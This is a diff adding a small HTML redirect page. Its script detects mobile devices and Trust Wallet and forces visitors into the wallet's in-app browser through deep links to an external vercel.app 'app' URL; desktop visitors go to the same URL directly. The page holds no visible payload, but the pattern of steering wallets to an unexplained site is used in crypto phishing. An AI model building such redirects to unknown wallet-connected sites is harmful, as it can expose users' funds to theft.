@@ -1,0 +1,45 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Redirecting...</title>
+</head>
+
+<body>
+<script>
+
+const APP = "https://d-app-lake-theta.vercel.app/app";
+
+function isMobile(){
+  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
+function isTrustWallet(){
+  return navigator.userAgent.includes("Trust");
+}
+
+/* SMART ROUTING */
+(function(){
+
+  if(isMobile()){
+
+    if(isTrustWallet()){
+      window.location.href =
+        "trust://open_url?url=" + encodeURIComponent(APP);
+      return;
+    }
+
+    /* fallback universal wallet bridge */
+    window.location.href =
+      "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(APP);
+    return;
+  }
+
+  /* desktop */
+  window.location.href = APP;
+
+})();
+</script>
+</body>
+</html>
